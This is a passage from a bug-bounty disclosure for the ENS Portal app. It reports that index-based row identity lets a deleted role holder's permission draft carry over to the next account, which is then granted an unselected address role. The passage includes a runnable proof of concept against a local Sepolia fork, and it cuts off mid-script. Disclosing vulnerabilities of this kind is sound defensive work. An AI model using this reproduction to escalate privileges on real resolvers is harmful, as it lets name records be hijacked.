# 90379 w a critical deleting one resolver role row rebinds its permission draft to the next account and grants that account an unselected address role

**Submitted on Aug 24th 2026 at 18:40:43 UTC by @Jornason for** [**Audit Competition | ENS**](https://immunefi.com/audit-competition/audit-competition-ens)

* **Report ID:** #90379
* **Report Type:** Websites & Apps
* **Report severity:** Critical
* **Target:** <https://github.com/immunefi-team/audit-comp-ens/tree/audit-comp-ready/apps/portal>
* **Impacts:**
  * Subdomain takeover without already-connected wallet interaction

## Description

## Brief/Intro

Portal's shared `DataTable` does not provide TanStack with a semantic row ID, so resolver-role rows are identified by their array index. `ResolverRolesSidebar` uses that positional `row.id` to decide whether to reset its permission draft.

After an administrator successfully removes account A, the chain-backed role refetch removes A from the list and shifts successor B into A's old index. The page and sidebar remain mounted. Opening B changes the live subject and original roles to B, but the reused row ID prevents the editable draft from resetting, so A's checked permissions remain selected.

If the administrator then makes a normal edit to B, Portal computes the difference between A's stale draft and B's current roles and grants the difference to B. In the reproduced flow, A has Text and Address, B has only Text, and the administrator selects only Content Hash for B. Portal sends:

```
grantRootRoles(ROLE_SET_ADDR | ROLE_SET_CONTENTHASH, B)
```

The transaction succeeds. B receives Address even though the administrator never selected it for B, then successfully changes the ENS address record.

## Vulnerability Details

### Root cause

{% stepper %}
{% step %}

## `DataTable.tsx`

`apps/portal/src/components/DataTable.tsx:28-47` accepts only `columns` and `data` and calls `useReactTable` without `getRowId`.
{% endstep %}

{% step %}

## Generated row ID

`apps/portal/src/components/DataTable.tsx:83-87` also uses the generated positional `row.id` as the React row key.
{% endstep %}

{% step %}

## Mounted sidebar

`apps/portal/src/features/resolver/components/ResolverRolesTable.tsx:97-137` keeps `editingRow` and the mounted sidebar while refreshed data is rendered.
{% endstep %}

{% step %}

## Current role values

`apps/portal/src/features/resolver/components/ResolverRolesSidebar.tsx:165-173` reads the current account and original roles from the new row.
{% endstep %}

{% step %}

## Draft reset condition

`apps/portal/src/features/resolver/components/ResolverRolesSidebar.tsx:175-184` resets `editedPermissions` only when the positional `row.id` changes.
{% endstep %}

{% step %}

## Stale permissions become grants

`apps/portal/src/lib/roles/rolesToPermissions.ts:66-105` treats permissions present in the stale draft but absent from B's originals as grants.
{% endstep %}

{% step %}

## Snapshot uses B's account

`apps/portal/src/features/resolver/components/ResolverRolesSidebar.tsx:295-304` snapshots those stale-derived grants with B's current account.
{% endstep %}

{% step %}

## Root grant encoding

`apps/portal/src/features/resolver/helpers/grantResolverRoles.ts:45-74` encodes them as a root grant to B.
{% endstep %}
{% endstepper %}

The state relation that should be `draft belongs to account` is instead `draft belongs to current array position`.

### Violated invariant

An authorization draft must remain bound to the exact account and resource from which it was initialized. Removing or reordering one row must never transfer its selected permissions into another account's transaction.

### Preconditions and ordinary workflow

* A and B are ordinary resolver-role holders in adjacent rows.
* A has at least one role B does not have.
* The owner removes A, remains on the same mounted Roles page after the successful refetch, then opens and edits B.
* The owner is authorized to perform both normal administrative actions.

B does not need to alter the browser, indexer, wallet, or transaction. B can be passive until the malformed grant has mined.

### Why this is not a mocked list-reorder theory

The browser submits A's real revoke to a pinned Sepolia fork, receives a successful receipt, and the local indexer derives the new list from chain state. B shifts only after the same production post-success synchronization path the application uses. The malformed grant is then a real Portal wallet request and successful contract transaction. The fresh full-page reload control does not reproduce the grant.

### Scope and duplicate check

The vulnerable table identity, draft synchronization, diff, and transaction preparation are all in the in-scope Portal. The resolver is used only to validate the consequence of the generated calldata.

The 59 public known issues contain no predecessor-deletion, positional row reuse, or cross-account resolver-role draft issue. The nearest Add User address issue concerns recipient display, whereas this PoC uses B's exact address and corrupts only the permission bitmap. Candidate 001 is resource-scope loss on one account; this candidate uses correctly represented root resources on two accounts and grants new authority to B. The last successfully observed official PR is an unrelated Hono dependency update. Private reports are not visible.

### Recommended fix

{% stepper %}
{% step %}

## Use stable row identities

Let `DataTable` accept `getRowId` and use a stable key such as lowercased account plus exact resource.
{% endstep %}

{% step %}

## Bind draft initialization to semantic identity

Key sidebar draft initialization to resolver address, account, and resource fingerprint, not `row.id` alone.
{% endstep %}

{% step %}

## Clear stale UI state

Clear the selected row and permission draft after close and after successful mutations.
{% endstep %}

{% step %}

## Review role changes

Show the exact role names/bitmap to grant and revoke in the final transaction review.
{% endstep %}

{% step %}

## Add regression coverage

Add regressions for predecessor deletion, insertion, sort/reorder, external refetch, and full-remount controls.
{% endstep %}
{% endstepper %}

## Impact Details

Selected impact: **Subdomain takeover without already-connected wallet interaction** (High).

The PoC demonstrates the literal takeover outcome end-to-end. An ordinary Portal Save — built from a permission draft that silently carried over from a deleted row — grants account B a root `ROLE_SET_ADDR` the administrator never selected for B, and B then rewrites the name's authoritative ETH address to an attacker-controlled account (`0x1111111111111111111111111111111111111111`): from that point the name resolves to an address B chose. The victim never interacts with B's wallet at any point: every victim action is an ordinary Portal flow (delete a row, open another account's sidebar, approve the presented Save), and the Save review modal surfaces only the action label and estimated cost with no role delta, so nothing tells the administrator the transaction contains an unselected grant.

B uses only the authority the Portal's own transaction granted. The negative control shows that once the exact root role is revoked, B's further writes revert — i.e., the unauthorized capability is real, on-chain, and entirely produced by the application's ordinary Save flow. No downstream user is shown sending funds to the rewritten address, and no ownership transfer is claimed: the demonstrated harm is unauthorized control of where an ENS name resolves, obtained through the application's own flow without any already-connected wallet interaction by the victim — precisely the subdomain-takeover outcome of the selected impact row.

## References

All links verified accessible (HTTP 200) on 2026-08-23.

### Program / asset

* Program Scope page (assets, impacts, Known Issues): <https://immunefi.com/audit-competition/audit-competition-ens/scope/>
* In-scope asset — Explorer app (`apps/portal`), branch `audit-comp-ready`: <https://github.com/immunefi-team/audit-comp-ens/tree/audit-comp-ready/apps/portal>

### Cited Portal source

Identical on the frozen audited fork `cda79aca`; the only post-freeze change on the branch is Dependabot PR #1, a Hono version bump in manifest files.

* DataTable.tsx: <https://github.com/immunefi-team/audit-comp-ens/blob/audit-comp-ready/apps/portal/src/components/DataTable.tsx>
* ResolverRolesTable.tsx: <https://github.com/immunefi-team/audit-comp-ens/blob/audit-comp-ready/apps/portal/src/features/resolver/components/ResolverRolesTable.tsx>
* ResolverRolesSidebar.tsx: <https://github.com/immunefi-team/audit-comp-ens/blob/audit-comp-ready/apps/portal/src/features/resolver/components/ResolverRolesSidebar.tsx>
* rolesToPermissions.ts: <https://github.com/immunefi-team/audit-comp-ens/blob/audit-comp-ready/apps/portal/src/lib/roles/rolesToPermissions.ts>
* grantResolverRoles.ts: <https://github.com/immunefi-team/audit-comp-ens/blob/audit-comp-ready/apps/portal/src/features/resolver/helpers/grantResolverRoles.ts>

## Link to Proof of Concept

<https://gist.github.com/Jornason/373d424dc6b2c62bbc47e1f8416f161e>

## Proof of Concept

### What this PoC is

A runnable pipeline that executes the in-scope Portal application end-to-end: it starts a local Anvil fork of Sepolia (pinned block `11543850`, hash `0x52eb10efadce9a831ec774576c52bbffcd6e34e44ed6f4bcd478540c0a10c9c6`, verified against the archive RPC), serves the frozen `apps/portal` source (`cda79aca`, identical to the in-scope `audit-comp-ready` branch for all cited code) through its own production dev server with the repository-supported mock wallet, intercepts every wallet request through a tracing RPC proxy, serves role rows through a chain-backed indexer stub derived live from fork state, and drives the real Roles UI with Playwright through the remove → success-callback → refetch → row-shift → edit → save lifecycle. All writes are local Anvil transactions; the archive RPC supplies parent state only, no user private key is used, and no production transaction is ever broadcast.

### Environment

* Frozen source: `cda79acaad59711b943fc68207ebb3f1d0ff8596`.
* Audited upstream revision: `63772fd872af472ced58b009499355f3430c2a86`.
* Sepolia fork: block `11543850`, hash `0x52eb10efadce9a831ec774576c52bbffcd6e34e44ed6f4bcd478540c0a10c9c6`.
* All transactions are local Anvil writes; no user private key is used.

### Step-by-step

Each step is performed by the pipeline and recorded in the attached evidence.

{% stepper %}
{% step %}

## Seed resolver-role holders

Seed A with `TEXT | ADDR = 17` and B with `TEXT = 16` on the resolver root, plus control holders C and D with the same pair of bitmaps.

Attachments:

* `002-four-role-holders-before-s9v2g6.png` — the four seeded role holders on the Roles page before removal
* `002-a-draft-before-remove-s9v2g6.png` — A's row state before removal
  {% endstep %}

{% step %}

## Remove A

Open A in Portal and successfully remove it. Decode the transaction as `revokeRootRoles(17, A)`.

Attachment:

* `002-a-remove-success-s9v2g6.png` — A's removal reported as successful
  {% endstep %}

{% step %}

## Wait for refetch and row shift

Wait for the production success callback, indexer synchronization, and chain-backed refetch. B moves into row index/ID `0` without a page or sidebar remount.

Attachment:

* `002-b-shifted-without-remount-s9v2g6.png` — after refetch, B sits in row 0 without remount
  {% endstep %}

{% step %}

## Open B

Open B. The sidebar displays B's account and B's live Text role, but Address remains selected from A's draft.

Attachment:

* `002-b-inherits-a-address-draft-s9v2g6.png` — the step-4 state: B's live roles shown, Address still selected from A's draft
  {% endstep %}

{% step %}

## Select Content Hash and save

Select only Content Hash for B and click Save.

Attachment:

* `002-b-save-review-omits-role-detail-s9v2g6.png` — the Save review shows no role-delta detail for B
  {% endstep %}

{% step %}

## Decode the wallet request

Decode the real wallet request as `grantRootRoles(257, B)`, where `257 = ADDR | CONTENTHASH`.

Attachment:

* `002-b-unintended-grant-success-s9v2g6.png` — Portal reporting "Update roles for 0x3c44…93bc" succeeded — the save silently included the Address grant
  {% endstep %}

{% step %}

## Verify B's final bitmap

Verify B's final bitmap is `273 = TEXT | ADDR | CONTENTHASH`.
{% endstep %}

{% step %}

## Verify unauthorized address write

Send `setAddr` as B and verify it succeeds.
{% endstep %}

{% step %}

## Revoke unintended grants

Revoke only the unintended Address and Content Hash grants, verify B returns to Text-only, and verify the same write now reverts.
{% endstep %}

{% step %}

## Run the fresh-reload control

Repeat a second predecessor-removal case but reload the page before opening the shifted successor. Address is unchecked and Save is disabled, proving the stale mounted component is the carrier.

Attachment:

* `002-fresh-remount-negative-control-s9v2g6.png` — control: after a fresh reload, Address is unchecked and Save disabled
  {% endstep %}
  {% endstepper %}

### Observed result

```
A initial bitmap: 17
B initial bitmap: 16
A removal: success, revokeRootRoles(17, A)
same page after refetch: true
B inherited Address draft: true
victim selected only Content Hash: true
B grant: success, grantRootRoles(257, B)
B final bitmap: 273
B setAddr after malformed grant: SUCCESS
B bitmap after exact cleanup: 16
B setAddr after cleanup: REVERTED
fresh reload control: Address unchecked, Text checked, Save disabled
verdict: BREAKS_RUNTIME_IN_REAL_SUCCESS_REFETCH_LIFECYCLE
```

The malformed grant transaction is `0x744b04e2eb67a6753a2d0dada0640d9c7f1a79704dbc929090370996b3bc883e` on local Anvil. B's successful address write is `0xc77b6c0242fed7a91c4465bee212cdda38f99a0bd95bc4f5668129a43bc87121`.

### How to run

Prerequisites: macOS/Linux with Node 22, pnpm 10, Foundry (`anvil`/`cast`), Python 3 with `playwright`, `web3`, and `eth_abi`, and a Sepolia archive RPC (default `https://sepolia.gateway.tenderly.co`, overridable via `ENS_HARDENING_ARCHIVE_RPC`). Clone the in-scope repo (`https://github.com/immunefi-team/audit-comp-ens`), `git checkout cda79acaad59711b943fc68207ebb3f1d0ff8596`, `pnpm install --frozen-lockfile`. The runner verifies the frozen commit and the pinned block hash, starts the fork, the RPC-proxy/indexer services, and the Portal server, drives the UI, writes all evidence files, and finishes by regenerating `SHA256SUMS.s9v2g6.txt` (verifiable with `shasum -a 256 -c`). As captured, the runner resolves the checkout at `<git-toplevel>/data/immunefi/ENS_Competition/workspaces/audit-runs/ens_kx7m_multi_m4j8_20260820T0720Z_86xofo/scope-src` relative to its own location; when running from the Gist bundle, point `SOURCE_ROOT` at your frozen checkout.

```sh
cd runtime/p7c4u9-002-row-identity-s9v2g6
./run_002_browser_fork_s9v2g6.zsh
```

Expected terminal output: `Candidate 002 browser/fork runtime passed: <evidence dir>`. A fresh hardening-pass rerun on 2026-08-23 (\~01:51 Asia/Shanghai) regenerated the verdict file with the same result, and the SHA-256 manifest passes 14/14.

### Complete PoC code

`run_002_browser_fork_s9v2g6.zsh` — one-command orchestrator (environment checks, fork/service/Portal bootstrap, browser drive, evidence hashing):

```zsh
#!/bin/zsh
set -euo pipefail

SCRIPT_DIR=${0:A:h}
PROJECT_ROOT=$(git -C ${SCRIPT_DIR} rev-parse --show-toplevel)
SOURCE_ROOT=${PROJECT_ROOT}/data/immunefi/ENS_Competition/workspaces/audit-runs/ens_kx7m_multi_m4j8_20260820T0720Z_86xofo/scope-src
PYTHON=/Users/jornason/anaconda3/envs/GNN/bin/python
NODE_BIN=/Users/jornason/.nvm/versions/node/v22.17.1/bin
FOUNDRY_BIN=/Users/jornason/.foundry/bin
ARCHIVE_RPC=${ENS_HARDENING_ARCHIVE_RPC:-https://sepolia.gateway.tenderly.co}
ANVIL_PORT=18556
RPC_PROXY_PORT=18557
INDEXER_PORT=15665
PORTAL_PORT=3001
ANVIL_RPC=http://127.0.0.1:${ANVIL_PORT}
PORTAL_RPC=http://127.0.0.1:${RPC_PROXY_PORT}
EVIDENCE=${SCRIPT_DIR}/evidence
LOGS=${SCRIPT_DIR}/logs
TRACE=${EVIDENCE}/002-rpc-trace-s9v2g6.jsonl
INDEXER_LOG=${EVIDENCE}/002-indexer-trace-s9v2g6.jsonl
RESOLVER=0x1DfaE31B93630751256c141dBCAada85C1c1B864
OWNER=0xEe93Be318b5f922a07362337B17316A4cDad5Bc7
ACCOUNT_A=0x70997970C51812dc3A010C7d01b50e0d17dc79C8
ACCOUNT_B=0x3C44CdDdB6a900fa2b585dd299e03d12FA4293BC
ACCOUNT_C=0x90F79bf6EB2c4f870365E785982E1f101E93b906
ACCOUNT_D=0x15d34AAf54267DB7D7c367839AAf71A00a2C6A65
NAME=ensv2-audit-20260822-m9x2p.eth
NODE=0xf875aa165d9b9315484f2a37142b473e6725a4db064ff7acf210e453fe392deb

export PATH=${NODE_BIN}:${FOUNDRY_BIN}:${PATH}
export NO_PROXY=127.0.0.1,localhost
export no_proxy=127.0.0.1,localhost
mkdir -p ${EVIDENCE} ${LOGS}

[[ $(git -C ${SOURCE_ROOT} rev-parse HEAD) == cda79acaad59711b943fc68207ebb3f1d0ff8596 ]] || {
  print -u2 'Unexpected frozen source revision'
  exit 1
}
${PYTHON} -c 'from playwright.sync_api import sync_playwright; import web3, eth_abi' >/dev/null
for command in node pnpm anvil cast curl lsof shasum; do
  command -v ${command} >/dev/null 2>&1 || { print -u2 "Missing command: ${command}"; exit 1; }
done
for port in ${ANVIL_PORT} ${RPC_PROXY_PORT} ${INDEXER_PORT} ${PORTAL_PORT}; do
  if lsof -nP -iTCP:${port} -sTCP:LISTEN >/dev/null 2>&1; then
    print -u2 "Port ${port} is already in use"
    exit 1
  fi
done

REMOTE_HASH=$(cast block 11543850 --field hash --rpc-url ${ARCHIVE_RPC})
[[ ${REMOTE_HASH} == 0x52eb10efadce9a831ec774576c52bbffcd6e34e44ed6f4bcd478540c0a10c9c6 ]] || {
  print -u2 "Archive RPC returned unexpected fork hash: ${REMOTE_HASH}"
  exit 1
}

PIDS=()
cleanup() {
  for pid in ${PIDS[@]:-}; do kill ${pid} >/dev/null 2>&1 || true; done
  for port in ${ANVIL_PORT} ${RPC_PROXY_PORT} ${INDEXER_PORT} ${PORTAL_PORT}; do
    lsof -nP -tiTCP:${port} -sTCP:LISTEN 2>/dev/null | xargs kill >/dev/null 2>&1 || true
  done
}
trap cleanup EXIT INT TERM

wait_rpc() {
  local url=$1 label=$2 i=0
  while ! curl -fsS --noproxy '*' --max-time 2 -H 'content-type: application/json' \
    --data '{"jsonrpc":"2.0","id":1,"method":"eth_chainId","params":[]}' ${url} >/dev/null 2>&1; do
    i=$((i + 1)); [[ ${i} -ge 240 ]] && { print -u2 "Timed out waiting for ${label}"; return 1; }
    sleep 0.5
  done
}
wait_http() {
  local url=$1 label=$2 i=0
  while ! curl -fsS --noproxy '*' --max-time 2 ${url} >/dev/null 2>&1; do
    i=$((i + 1)); [[ ${i} -ge 480 ]] && { print -u2 "Timed out waiting for ${label}"; return 1; }
    sleep 0.5
  done
}

anvil --fork-url ${ARCHIVE_RPC} --fork-block-number 11543850 --chain-id 11155111 \
  --host 127.0.0.1 --port ${ANVIL_PORT} --auto-impersonate --silent \
  >${LOGS}/anvil-s9v2g6.log 2>&1 &
PIDS+=($!)
wait_rpc ${ANVIL_RPC} anvil

${PYTHON} ${SCRIPT_DIR}/row_identity_services_s9v2g6.py \
  --rpc-port ${RPC_PROXY_PORT} --indexer-port ${INDEXER_PORT} --upstream ${ANVIL_RPC} \
  --trace ${TRACE} --indexer-log ${INDEXER_LOG} --resolver ${RESOLVER} \
  --accounts ${ACCOUNT_A} ${ACCOUNT_B} ${ACCOUNT_C} ${ACCOUNT_D} \
  --owner ${OWNER} --name ${NAME} --node ${NODE} >${LOGS}/services-s9v2g6.log 2>&1 &
PIDS+=($!)
wait_rpc ${PORTAL_RPC} rpc-proxy
wait_http http://127.0.0.1:${INDEXER_PORT}/ indexer

(cd ${SOURCE_ROOT} && \
  VITE_USE_MOCK_WALLET=true VITE_MOCK_ACCOUNT=${OWNER} \
  VITE_SEPOLIA_RPC_URL=${PORTAL_RPC} \
  VITE_INDEXER_GRAPHQL_URL=http://127.0.0.1:${INDEXER_PORT}/graphql \
  VITE_PUBLIC_POSTHOG_KEY=local-002-s9v2g6 \
  VITE_PUBLIC_POSTHOG_HOST=http://127.0.0.1:${INDEXER_PORT} \
  pnpm --filter portal dev --host 127.0.0.1 >${LOGS}/portal-s9v2g6.log 2>&1) &
PIDS+=($!)
wait_http http://127.0.0.1:${PORTAL_PORT}/ portal

${PYTHON} ${SCRIPT_DIR}/row_identity_browser_s9v2g6.py \
  --app http://127.0.0.1:${PORTAL_PORT} --rpc ${ANVIL_RPC} \
  --trace ${TRACE} --evidence ${EVIDENCE} >${LOGS}/browser-s9v2g6.log 2>&1

(cd ${SCRIPT_DIR} && shasum -a 256 \
  row_identity_services_s9v2g6.py row_identity_browser_s9v2g6.py \
  run_002_browser_fork_s9v2g6.zsh evidence/002-runtime-verdict-s9v2g6.json \
  evidence/002-rpc-trace-s9v2g6.jsonl evidence/002-indexer-trace-s9v2g6.jsonl \
  evidence/002-*.png > SHA256SUMS.s9v2g6.txt)

print "Candidate 002 browser/fork runtime passed: ${EVIDENCE}"
```

`row_identity_services_s9v2g6.py` — tracing RPC proxy (records every `eth_sendTransaction` request/response pair) plus a chain-backed multi-holder GraphQL indexer stub whose role rows are derived live from fork state:

```python
#!/usr/bin/env python3
"""RPC proxy and chain-backed multi-holder indexer for candidate 002."""

import argparse
import json
import threading
import time
import urllib.request
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer

from eth_abi import decode, encode
from eth_utils import keccak


def selector(signature: str) -> bytes:
    return keccak(text=signature)[:4]


def rpc(url: str, method: str, params: list[object]):
    body = json.dumps(
        {"jsonrpc": "2.0", "id": int(time.time() * 1_000_000), "method": method, "params": params}
    ).encode()
    request = urllib.request.Request(url, data=body, headers={"Content-Type": "application/json"})
    with urllib.request.urlopen(request, timeout=120) as response:
        result = json.loads(response.read())
    if "error" in result:
        raise RuntimeError(result["error"])
    return result["result"]


def root_roles(url: str, resolver: str, account: str) -> int:
    data = "0x" + (
        selector("roles(uint256,address)")
        + encode(["uint256", "address"], [0, account])
    ).hex()
    raw = rpc(url, "eth_call", [{"to": resolver, "data": data}, "latest"])
    return decode(["uint256"], bytes.fromhex(raw[2:]))[0]


class CorsHandler(BaseHTTPRequestHandler):
    def log_message(self, *_args):
        pass

    def cors(self) -> None:
        self.send_header("Access-Control-Allow-Origin", "*")
        self.send_header("Access-Control-Allow-Methods", "GET, POST, OPTIONS")
        self.send_header("Access-Control-Allow-Headers", "*")
        self.send_header("Access-Control-Max-Age", "86400")

    def do_OPTIONS(self) -> None:
        self.send_response(204)
        self.cors()
        self.send_header("Content-Length", "0")
        self.end_headers()


class RpcProxy(CorsHandler):
    upstream = ""
    trace_path = ""
    trace_sequence = 0

    def do_POST(self) -> None:
        size = int(self.headers.get("Content-Length", "0"))
        body = self.rfile.read(size)
        sent_transactions = []
        try:
            payload = json.loads(body)
            requests = payload if isinstance(payload, list) else [payload]
            for request in requests:
                if request.get("method") != "eth_sendTransaction":
                    continue
                RpcProxy.trace_sequence += 1
                trace_sequence = RpcProxy.trace_sequence
                sent_transactions.append((request, trace_sequence))
                tx = (request.get("params") or [{}])[0]
                data = tx.get("data") or tx.get("input") or "0x"
                with open(self.trace_path, "a", encoding="utf-8") as handle:
                    handle.write(
                        json.dumps(
                            {
                                "ts": time.time(),
                                "phase": "request",
                                "traceSequence": trace_sequence,
                                "requestId": request.get("id"),
                                "method": "eth_sendTransaction",
                                "from": tx.get("from"),
                                "to": tx.get("to"),
                                "data": data,
                                "selector": data[:10].lower(),
                            }
                        )
                        + "\n"
                    )
        except Exception:
            pass

        request = urllib.request.Request(
            self.upstream, data=body, headers={"Content-Type": "application/json"}
        )
        try:
            with urllib.request.urlopen(request, timeout=180) as response:
                response_body = response.read()
        except Exception as error:
            response_body = json.dumps(
                {"jsonrpc": "2.0", "id": None, "error": {"code": -32000, "message": str(error)}}
            ).encode()
        if sent_transactions:
            try:
                decoded_response = json.loads(response_body)
                responses = decoded_response if isinstance(decoded_response, list) else [decoded_response]
                responses_by_id = {response.get("id"): response for response in responses}
                with open(self.trace_path, "a", encoding="utf-8") as handle:
                    for sent, trace_sequence in sent_transactions:
                        result = responses_by_id.get(sent.get("id"), {})
                        handle.write(
                            json.dumps(
                                {
                                    "ts": time.time(),
                                    "phase": "response",
                                    "traceSequence": trace_sequence,
                                    "requestId": sent.get("id"),
                                    "method": "eth_sendTransaction",
                                    "transactionHash": result.get("result"),
                                    "error": result.get("error"),
                                }
                            )
                            + "\n"
                        )
            except Exception:
                pass
        self.send_response(200)
        self.send_header("Content-Type", "application/json")
        self.cors()
        self.send_header("Content-Length", str(len(response_body)))
        self.end_headers()
        self.wfile.write(response_body)

    def do_GET(self) -> None:
        body = b"{}"
        self.send_response(200)
        self.send_header("Content-Type", "application/json")
        self.cors()
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)


class IndexerStub(CorsHandler):
    upstream = ""
    resolver = ""
    accounts: list[str] = []
    owner = ""
    name = ""
    node = ""
    log_path = ""

    def do_POST(self) -> None:
        size = int(self.headers.get("Content-Length", "0"))
        raw = self.rfile.read(size)
        try:
            request = json.loads(raw or b"{}")
        except json.JSONDecodeError:
            request = {}
        query = request.get("query", "")
        bitmaps = {account: root_roles(self.upstream, self.resolver, account) for account in self.accounts}
        role_rows = [
            {
                "account": account,
                "resource": "0x" + "00" * 32,
                "roleBitmap": str(bitmaps[account]),
                "blockNumber": 11_543_851 + index,
                "transactionHash": None,
                "timestamp": 0,
                "name": None,
            }
            for index, account in enumerate(self.accounts)
            if bitmaps[account]
        ]
        resolver = {
            "id": self.resolver.lower(),
            "address": self.resolver,
            "nodeCount": 1,
            "aliasCount": 0,
            "roleHolderCount": len(role_rows),
            "nodes": [
                {
                    "id": self.node,
                    "name": self.name,
                    "owner": {"id": self.owner.lower()},
                    "resolver": {"id": self.resolver.lower(), "address": self.resolver},
                }
            ],
            "aliases": [],
            "roles": role_rows,
            "events": [],
        }
        data = {
            "resolver": resolver,
            "events": [],
            "domains": [],
            "roles": [],
            "registry": None,
        }
        with open(self.log_path, "a", encoding="utf-8") as handle:
            handle.write(
                json.dumps(
                    {
                        "ts": time.time(),
                        "operation": query.split("{")[0].strip() or "non-graphql-local-request",
                        "bitmaps": {account: str(bitmap) for account, bitmap in bitmaps.items()},
                        "visibleAccounts": [row["account"] for row in role_rows],
                    }
                )
                + "\n"
            )
        body = json.dumps({"data": data}).encode()
        self.send_response(200)
        self.send_header("Content-Type", "application/json")
        self.cors()
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)

    def do_GET(self) -> None:
        body = b"{}"
        self.send_response(200)
        self.send_header("Content-Type", "application/json")
        self.cors()
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)


def main() -> None:
    parser = argparse.ArgumentParser()
    parser.add_argument("--rpc-port", type=int, required=True)
    parser.add_argument("--indexer-port", type=int, required=True)
    parser.add_argument("--upstream", required=True)
    parser.add_argument("--trace", required=True)
    parser.add_argument("--indexer-log", required=True)
    parser.add_argument("--resolver", required=True)
    parser.add_argument("--accounts", nargs="+", required=True)
    parser.add_argument("--owner", required=True)
    parser.add_argument("--name", required=True)
    parser.add_argument("--node", required=True)
    args = parser.parse_args()

    open(args.trace, "w", encoding="utf-8").close()
    open(args.indexer_log, "w", encoding="utf-8").close()
    RpcProxy.upstream = args.upstream
    RpcProxy.trace_path = args.trace
    IndexerStub.upstream = args.upstream
    IndexerStub.resolver = args.resolver
    IndexerStub.accounts = args.accounts
    IndexerStub.owner = args.owner
    IndexerStub.name = args.name
    IndexerStub.node = args.node
    IndexerStub.log_path = args.indexer_log

    indexer = ThreadingHTTPServer(("127.0.0.1", args.indexer_port), IndexerStub)
    threading.Thread(target=indexer.serve_forever, daemon=True).start()
    ThreadingHTTPServer(("127.0.0.1", args.rpc_port), RpcProxy).serve_forever()


if __name__ == "__main__":
    main()
```

`row_identity_browser_s9v2g6.py` — Playwright driver executing the full remove → refetch → row-shift → edit → save lifecycle, decoding all three Portal transactions, asserting the terminal state and both negative controls, and writing the verdict JSON:

```python
#!/usr/bin/env python3
"""Run candidate 002 through real Portal mutation/refetch lifecycle."""

import argparse
import json
import re
import time
from pathlib import Path
from urllib.parse import urlparse

from eth_abi import decode, encode
from eth_utils import keccak, to_checksum_address
from playwright.sync_api import sync_playwright
from web3 import Web3


BLOCK_NUMBER = 11_543_850
BLOCK_HASH = "0x52eb10efadce9a831ec774576c52bbffcd6e34e44ed6f4bcd478540c0a10c9c6"
REGISTRY = to_checksum_address("0xBDC85dD5b15D7ecb354cd7cb6f2c50b4f2c4F0E2")
RESOLVER = to_checksum_address("0x1DfaE31B93630751256c141dBCAada85C1c1B864")
OWNER = to_checksum_address("0xEe93Be318b5f922a07362337B17316A4cDad5Bc7")
ACCOUNT_A = to_checksum_address("0x70997970C51812dc3A010C7d01b50e0d17dc79C8")
ACCOUNT_B = to_checksum_address("0x3C44CdDdB6a900fa2b585dd299e03d12FA4293BC")
ACCOUNT_C = to_checksum_address("0x90F79bf6EB2c4f870365E785982E1f101E93b906")
ACCOUNT_D = to_checksum_address("0x15d34AAf54267DB7D7c367839AAf71A00a2C6A65")
ACCOUNTS = (ACCOUNT_A, ACCOUNT_B, ACCOUNT_C, ACCOUNT_D)
NAME = "ensv2-audit-20260822-m9x2p.eth"
LABEL = "ensv2-audit-20260822-m9x2p"
ROLE_SET_ADDR = 1
ROLE_SET_TEXT = 16
ROLE_SET_CONTENTHASH = 256
A_BITMAP = ROLE_SET_ADDR | ROLE_SET_TEXT
B_BITMAP = ROLE_SET_TEXT
UNINTENDED_GRANT = ROLE_SET_ADDR | ROLE_SET_CONTENTHASH
COIN_TYPE_ETH = 60


def selector(signature: str) -> bytes:
    return keccak(text=signature)[:4]


def encode_call(signature: str, types: list[str], values: list[object]) -> str:
    return "0x" + (selector(signature) + encode(types, values)).hex()


def namehash(name: str) -> bytes:
    node = b"\x00" * 32
    for label in reversed(name.split(".")):
        node = keccak(node + keccak(text=label))
    return node


NODE = namehash(NAME)


class Chain:
    def __init__(self, url: str):
        self.w3 = Web3(Web3.HTTPProvider(url, request_kwargs={"timeout": 120}))
        if not self.w3.is_connected():
            raise RuntimeError(f"cannot reach {url}")

    def prepare(self, account: str) -> None:
        self.w3.provider.make_request("anvil_impersonateAccount", [account])
        self.w3.provider.make_request("anvil_setBalance", [account, hex(100 * 10**18)])

    def send(self, sender: str, target: str, data: str, expected_status: int = 1) -> dict:
        tx_hash = self.w3.eth.send_transaction(
            {"from": sender, "to": target, "data": data, "gas": 5_000_000}
        )
        receipt = self.w3.eth.wait_for_transaction_receipt(tx_hash, timeout=120)
        if receipt.status != expected_status:
            raise RuntimeError(f"unexpected status {receipt.status}: {Web3.to_hex(tx_hash)}")
        return {
            "hash": Web3.to_hex(tx_hash),
            "status": receipt.status,
            "blockNumber": receipt.blockNumber,
            "gasUsed": receipt.gasUsed,
        }

    def call(self, target: str, data: str) -> bytes:
        return self.w3.eth.call({"to": target, "data": data})

    def roles(self, account: str) -> int:
        return decode(
            ["uint256"],
            self.call(
                RESOLVER,
                encode_call("roles(uint256,address)", ["uint256", "address"], [0, account]),
            ),
        )[0]

    def addr(self) -> bytes:
        return decode(
            ["bytes"],
            self.call(
                RESOLVER,
                encode_call(
                    "addr(bytes32,uint256)", ["bytes32", "uint256"], [NODE, COIN_TYPE_ETH]
                ),
            ),
        )[0]


def local_only(route) -> None:
    host = urlparse(route.request.url).hostname
    if host in {"127.0.0.1", "localhost", None}:
        route.continue_()
    else:
        route.abort()


def main() -> None:
    parser = argparse.ArgumentParser()
    parser.add_argument("--app", required=True)
    parser.add_argument("--rpc", required=True)
    parser.add_argument("--trace", required=True)
    parser.add_argument("--evidence", required=True)
    args = parser.parse_args()

    evidence = Path(args.evidence)
    evidence.mkdir(parents=True, exist_ok=True)
    chain = Chain(args.rpc)
    block = chain.w3.eth.get_block(BLOCK_NUMBER)
    if block.hash.hex().removeprefix("0x") != BLOCK_HASH.removeprefix("0x"):
        raise RuntimeError("fixed fork hash mismatch")
    for account in (OWNER, *ACCOUNTS):
        chain.prepare(account)

    actual_resolver = to_checksum_address(
        decode(
            ["address"],
            chain.call(REGISTRY, encode_call("getResolver(string)", ["string"], [LABEL])),
        )[0]
    )
    if actual_resolver != RESOLVER:
        raise RuntimeError(f"unexpected resolver at fork: {actual_resolver}")
    if any(chain.roles(account) for account in ACCOUNTS):
        raise RuntimeError("one of the test collaborators already has root roles")

    seed_transactions = {}
    for account, bitmap in (
        (ACCOUNT_A, A_BITMAP),
        (ACCOUNT_B, B_BITMAP),
